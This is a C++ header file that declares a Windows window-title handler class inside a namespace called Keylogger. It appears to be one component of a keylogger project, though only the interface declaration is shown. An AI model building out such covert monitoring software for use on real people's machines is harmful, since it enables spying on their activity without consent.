#ifndef WINDOW_HANDLER_WINDOWS_H
#define WINDOW_HANDLER_WINDOWS_H

#ifdef _WIN32

#include "IWindowHandler.h"

namespace Keylogger {

class WindowHandlerWindows : public IWindowHandler {
 public:
    std::string getWindowString();
};

}

#endif // defined(_WiN32)

#endif // WINDOW_HANDLER_WINDOWS_H
